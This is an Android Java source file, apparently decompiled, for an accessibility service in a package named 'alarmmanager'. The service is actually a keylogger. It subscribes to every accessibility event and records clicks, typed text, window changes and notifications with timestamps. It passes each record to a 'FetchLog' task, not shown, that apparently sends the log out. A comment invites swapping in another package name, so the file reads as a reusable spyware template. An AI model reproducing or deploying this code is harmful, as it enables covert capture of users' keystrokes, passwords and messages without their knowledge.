package com.makrov.alarmmanager;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.SuppressLint;
import android.content.Context;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.text.SimpleDateFormat;
import java.util.Date;

public class MyAccessibilityService extends AccessibilityService {

    private final AccessibilityServiceInfo info = new AccessibilityServiceInfo();

    public static boolean isAccessibilitySettingsOn(Context paramContext) {
        try {
            int i = Settings.Secure.getInt(paramContext.getApplicationContext().getContentResolver(), "accessibility_enabled");
            TextUtils.SimpleStringSplitter localSimpleStringSplitter = new TextUtils.SimpleStringSplitter(':');
            if (i == 1) {
                String enabled_accessibility_services = Settings.Secure.getString(paramContext.getApplicationContext().getContentResolver(), "enabled_accessibility_services");
                if (enabled_accessibility_services != null) {
                    localSimpleStringSplitter.setString(enabled_accessibility_services);
                    while (localSimpleStringSplitter.hasNext())
                        // ##############################change this package and classname
                        if (localSimpleStringSplitter.next().equalsIgnoreCase("com.makrov.alarmmanager/com.makrov.alarmmanager.MyAccessibilityService"))
                            return true;
                }
            }
            return false;
        } catch (Settings.SettingNotFoundException localSettingNotFoundException) {
            return false;
        }
    }

    private String getEventText(AccessibilityEvent accessibilityEvent) {
        StringBuilder localStringBuilder = new StringBuilder();
        for (CharSequence charSequence : accessibilityEvent.getText())
            localStringBuilder.append(charSequence);
        return localStringBuilder.toString();
    }

    private String getEventType(AccessibilityEvent paramAccessibilityEvent) {
        int i = paramAccessibilityEvent.getEventType();
        if (i != 1) {
            if (i != 2) {
                if (i != 4) {
                    if (i != 8) {
                        if (i != 16) {
                            if (i != 32) {
                                if (i != 64) return "d"; //default
                                return "N"; //Notification
                            }
                            return "C"; //Changed
                        }
                        return "T"; //Typed
                    }
                    return "F"; //Focused
                }
                return "S"; //Selected
            }
            return "LC"; //Long Clicked
        }
        return "C"; //Clicked
    }

    @Override
    @SuppressLint({"WrongConstant", "SimpleDateFormat"})
    public void onAccessibilityEvent(AccessibilityEvent paramAccessibilityEvent) {
        Object localObject1;
        StringBuilder localObject2;
        if (paramAccessibilityEvent.getEventType() == 1) {
            Log.e("Events     :", getEventType(paramAccessibilityEvent));
            localObject1 = new StringBuilder();
            ((StringBuilder) localObject1).append("");
            ((StringBuilder) localObject1).append(paramAccessibilityEvent.getClassName());
            Log.e("Class name :", localObject1.toString());
            localObject1 = new StringBuilder();
            ((StringBuilder) localObject1).append("");
            ((StringBuilder) localObject1).append(paramAccessibilityEvent.getPackageName());
            Log.e("Package name :", localObject1.toString());
            Log.e("Text", getEventText(paramAccessibilityEvent));
            Log.e("Text2", paramAccessibilityEvent.getText().toString());
            localObject1 = new StringBuilder();
            ((StringBuilder) localObject1).append("");
            ((StringBuilder) localObject1).append(paramAccessibilityEvent.getEventTime());
            Log.e("Time", localObject1.toString());
            localObject1 = new Date();
            localObject1 = new SimpleDateFormat("hh:mm:ss").format((Date) localObject1);
            localObject2 = new StringBuilder();
            localObject2.append((String) localObject1);
            localObject2.append(" ");
            localObject2.append(getEventType(paramAccessibilityEvent));
            localObject2.append(paramAccessibilityEvent.getText().toString());
            localObject1 = localObject2.toString();
            Log.e(getEventType(paramAccessibilityEvent), (String) localObject1);
            new FetchLog().execute((String) localObject1);
        }
        if (paramAccessibilityEvent.getEventType() == 16) {
            localObject1 = new Date();
            localObject1 = new SimpleDateFormat("hh:mm:ss").format((Date) localObject1);
            localObject2 = new StringBuilder();
            localObject2.append((String) localObject1);
            localObject2.append(" ");
            localObject2.append(getEventType(paramAccessibilityEvent));
            localObject2.append(paramAccessibilityEvent.getText().toString());
            localObject1 = localObject2.toString();
            Log.e(getEventType(paramAccessibilityEvent), (String) localObject1);
            new FetchLog().execute((String) localObject1);
        }
        if (paramAccessibilityEvent.getEventType() == 8388608) {
            localObject1 = new Date();
            localObject1 = new SimpleDateFormat("hh:mm:ss").format((Date) localObject1);
            localObject2 = new StringBuilder();
            localObject2.append((String) localObject1);
            localObject2.append(" ");
            localObject2.append(getEventType(paramAccessibilityEvent));
            localObject2.append(paramAccessibilityEvent.getText().toString());
            localObject1 = localObject2.toString();
            Log.e(getEventType(paramAccessibilityEvent), (String) localObject1);
            new FetchLog().execute((String) localObject1);
        }
        if (paramAccessibilityEvent.getEventType() == 2) {
            localObject1 = new Date();
            localObject1 = new SimpleDateFormat("hh:mm:ss").format((Date) localObject1);
            localObject2 = new StringBuilder();
            localObject2.append((String) localObject1);
            localObject2.append(" ");
            localObject2.append(getEventType(paramAccessibilityEvent));
            localObject2.append(paramAccessibilityEvent.getText().toString());
            localObject1 = localObject2.toString();
            Log.e(getEventType(paramAccessibilityEvent), (String) localObject1);
            new FetchLog().execute((String) localObject1);
        }
        if (paramAccessibilityEvent.getEventType() == 128) {
            localObject1 = new Date();
            localObject1 = new SimpleDateFormat("hh:mm:ss").format((Date) localObject1);
            localObject2 = new StringBuilder();
            localObject2.append((String) localObject1);
            localObject2.append(" ");
            localObject2.append(getEventType(paramAccessibilityEvent));
            localObject2.append(paramAccessibilityEvent.getText().toString());
            localObject1 = localObject2.toString();
            Log.e(getEventType(paramAccessibilityEvent), (String) localObject1);
            new FetchLog().execute((String) localObject1);
        }
    }
    @Override
    public void onInterrupt() {
    }
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo localAccessibilityServiceInfo = this.info;
        localAccessibilityServiceInfo.eventTypes = -1;
        localAccessibilityServiceInfo.flags = 1;
        localAccessibilityServiceInfo.feedbackType = 16;
        setServiceInfo(localAccessibilityServiceInfo);
    }
}